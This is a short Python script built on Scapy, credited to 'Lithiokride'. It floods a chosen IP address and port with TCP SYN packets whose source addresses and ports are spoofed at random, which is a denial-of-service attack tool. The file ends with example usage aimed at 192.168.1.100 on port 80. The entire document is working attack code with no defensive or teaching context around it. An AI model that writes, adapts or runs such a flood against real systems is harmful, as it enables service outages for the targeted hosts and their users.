from scapy.all import *
# Written by Lithiokride

def tcp_flod(target_ip, target_port, packet_count): 
    try:
        # Send TCP packets in a loop with a counter
        for count in range(1, packet_count + 1):
            # Define the source IP and port (randomized)
            src_ip = RandIP()
            src_port = RandShort()

            # Craft the TCP packet
            packet = IP(dst=target_ip, src=src_ip) / TCP(dport=target_port, sport=src_port, flags='S')

            # Send the TCP packet
            send(packet, verbose=False)

            # Print packet count every 100 packets
            if count % 100 == 0:
                print(f"Packets sent: {count}")

    except KeyboardInterrupt:
        print(f"\nStopped. Total packets sent: {count - 1}")  # Show total packets sent before exiting

    print(f"Sent {packet_count} TCP SYN packets to {target_ip}:{target_port}")

# Example usage
target_ip = "192.168.1.100"  # Replace with the target IP
target_port = 80              # Replace with the target port
packet_count = 1000           # Number of packets to send

tcp_flod(target_ip, target_port, packet_count)
